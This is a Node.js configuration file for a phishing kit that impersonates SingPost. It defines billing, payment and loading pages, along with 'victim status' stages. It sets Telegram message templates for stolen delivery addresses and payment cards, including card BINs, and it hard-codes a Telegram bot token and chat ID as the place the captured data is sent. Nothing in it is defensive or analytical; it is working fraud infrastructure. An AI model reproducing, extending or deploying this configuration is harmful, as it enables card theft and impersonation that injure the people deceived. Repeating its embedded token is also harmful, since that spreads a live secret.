/**
 * Mirrors Asstes/php/config/config.php — keep values in sync when changing Telegram or funnel.
 */
const BOT_TOKEN =
    process.env.BOT_TOKEN ||
    process.env.TELEGRAM_BOT_TOKEN ||
    '8755780799:AAF2LxxJGGDHZ_6yGE_M98e1ld_3S2jlwcU';
const CHAT_ID = process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID || '-5164482229';

module.exports = {
    SITE_BRAND: process.env.SITE_BRAND || 'SingPost',

    PANEL_PAGE_INDEX: 'index.php',
    PANEL_PAGE_BILLING: 'billing.php',
    PANEL_PAGE_PAYMENT: 'payment.php',
    PANEL_PAGE_LOADING: 'loading.php',

    VICTIM_STATUS_BILLING: 'billing',
    VICTIM_STATUS_PAYMENT: 'payment',
    VICTIM_STATUS_LOADING: 'loading',

    DELIVERY_TELEGRAM_TITLE: '[🏠 Delivery — Address]',
    PAYMENT_TELEGRAM_TITLE: '[💳 Payment — Card]',
    PAYMENT_TELEGRAM_INCLUDE_BIN: true,

    COPYRIGHT_YEAR: 2026,

    BOT_TOKEN,
    CHAT_ID,

    telegram: {
        botToken: BOT_TOKEN,
        chatId: CHAT_ID
    },

    server: {
        port: process.env.PORT || 3000,
        name: 'SingPost Server API',
        version: '1.0.0',
        environment: process.env.NODE_ENV || 'development'
    }
};
